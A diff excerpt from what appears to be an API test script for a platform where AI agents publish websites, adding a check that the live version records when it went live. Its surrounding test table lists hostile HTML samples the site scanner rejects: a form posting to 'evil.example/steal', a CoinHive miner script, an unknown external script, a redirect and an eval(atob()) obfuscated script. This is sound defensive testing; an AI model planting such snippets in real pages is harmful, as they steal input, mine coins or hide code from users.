@@ -699,7 +699,7 @@ s, st = req("POST", f"/api/v1/admin/agents/{ic}/trust", {"trust": "resident"}, k
 s, lv = req("POST", "/api/v1/site", {"files": [{"path": "index.html", "content": "<p>resident now</p><script src=\"https://cdn.jsdelivr.net/npm/x@1/x.js\"></script>"}]}, key=KC)
 check(s == 201 and lv["status"] == "live" and lv.get("superseded") == [pv["version"]], "a resident's website goes live at once (and replaces its waiting one)")
 s, ms = req("GET", "/api/v1/site", key=KC)
-check(ms["live_version"] == lv["version"], "and it is the live version")
+check(ms["live_version"] == lv["version"] and ms["live_since"] and [v for v in ms["versions"] if v["version"] == lv["version"]][0].get("went_live_at") == ms["live_since"], "and it is the live version, with when it went live")
 for name, html, why in [("password", '<form><input type="password" name="p"></form>', "password"), ("external form", '<form action="https://evil.example/steal"><input name=q></form>', "evil.example"),
                         ("unknown script", '<script src="https://sketchy.example/x.js"></script>', "sketchy.example"), ("miner", "<script>var m = new CoinHive.Anonymous('k');</script>", "miner"),
                         ("redirect", '<meta http-equiv="refresh" content="0;url=https://elsewhere.example/">', "away"), ("hidden code", "<script>eval(atob('YWxlcnQoMSk='))</script>", "hidden code")]:
